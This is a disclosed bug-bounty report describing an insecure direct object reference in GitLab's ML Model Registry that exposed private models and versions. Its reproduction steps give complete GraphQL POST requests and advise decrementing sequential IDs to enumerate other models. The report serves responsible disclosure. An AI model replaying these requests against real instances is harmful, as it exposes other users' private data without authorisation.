# IDOR Exposes All Machine Learning Models

## Report Details
- **Report ID**: 2528293
- **URL**: https://hackerone.com/reports/2528293
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-05-31T04:22:25.349Z
- **Disclosed**: 2024-10-01T09:38:46.725Z

## Reporter
- **Username**: moblig
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

Hi team,

I found an IDOR affecting the Machine Learning Model Registry in Gitlab (https://docs.gitlab.com/ee/user/project/ml/experiment_tracking/)
This vulnerability allows an attacker to access any Model Registry as well as different versions of the model. Model ID's are also easy to guess as they are incremental, making it easy for an attacker to expose all models

*Example of exposed Model*
{F3314537}

### Steps to reproduce

You can use two accounts to validate this vulnerability, but to make reproduction simpler, I created a private project with the Model Registry specifically set as 'private' so that you can validate that private models are indeed accessible through this IDOR
{F3314516}

1. Login to https://gitlab.com 
2. Intercept any response to `/api/graphql` and extract the values of the `cookie`& `X-Csrf-Token` headers in order to replace them in the request below:
```bash
POST /api/graphql HTTP/2
Host: gitlab.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 1620
Origin: https://gitlab.com
Cookie: <replace-here>
X-Csrf-Token: <replace-here>

{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/1000401"},"query":"query getModel($id: MlModelID!) {\n  mlModel(id: $id) {\n    id\n    description\n    name\n    versionCount\n    candidateCount\n    latestVersion {\n      id\n      version\n      packageId\n      description\n      candidate {\n        id\n        name\n        iid\n        eid\n        status\n        params {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metadata {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metrics {\n          nodes {\n            id\n            name\n            value\n            step\n            __typename\n          }\n          __typename\n        }\n        ciJob {\n          id\n          webPath\n          name\n          pipeline {\n            id\n            mergeRequest {\n              id\n              iid\n              title\n              webUrl\n              __typename\n            }\n            user {\n              id\n              avatarUrl\n              webUrl\n              username\n              name\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        _links {\n          showPath\n          artifactPath\n          __typename\n        }\n        __typename\n      }\n      _links {\n        showPath\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
As you can see, information from the private model is exposed:
{F3314518}

Since the ID is easily guessable, you can decrement the value of the ID in order to access other Models.

3. Also, the response to the request above includes the ID of the different model versions, you can confirm these can also be accessed by using the following request:

```bash
POST /api/graphql HTTP/2
Host: gitlab.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 1714
Origin: https://gitlab.com
Cookie: <replace-here>
X-Csrf-Token: <replace-here>

{"operationName":"getModelVersion","variables":{"modelId":"gid://gitlab/Ml::Model/1000401","modelVersionId":"gid://gitlab/Ml::ModelVersion/1000535"},"query":"query getModelVersion($modelId: MlModelID!, $modelVersionId: MlModelVersionID!) {\n  mlModel(id: $modelId) {\n    id\n    name\n    version(modelVersionId: $modelVersionId) {\n      id\n      version\n      packageId\n      description\n      candidate {\n        id\n        name\n        iid\n        eid\n        status\n        params {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metadata {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metrics {\n          nodes {\n            id\n            name\n            value\n            step\n            __typename\n          }\n          __typename\n        }\n        ciJob {\n          id\n          webPath\n          name\n          pipeline {\n            id\n            mergeRequest {\n              id\n              iid\n              title\n              webUrl\n              __typename\n            }\n            user {\n              id\n              avatarUrl\n              webUrl\n              username\n              name\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        _links {\n          showPath\n          artifactPath\n          __typename\n        }\n        __typename\n      }\n      _links {\n        showPath\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
{F3314528}

## Impact

Access to all existing models since the ID is incremental.
This affects all Gitlab tiers, offerings as well as Gitlab most recent version

> Tier: Free, Premium, Ultimate
Offering: GitLab.com, Self-managed, GitLab Dedicated
History 
- Introduced in GitLab 15.11 as an experiment release with a flag named ml_experiment_tracking. Disabled by default. To enable the feature, an administrator can enable the feature flag named ml_experiment_tracking.
- Generally available in GitLab 16.2.

## Attachments
- Screenshot_2024-05-30_at_9.12.16_PM.png
- Screenshot_2024-05-30_at_10.04.49_PM.png
- Screenshot_2024-05-30_at_10.14.43_PM.png
- Screenshot_2024-05-30_at_9.50.10_PM.png
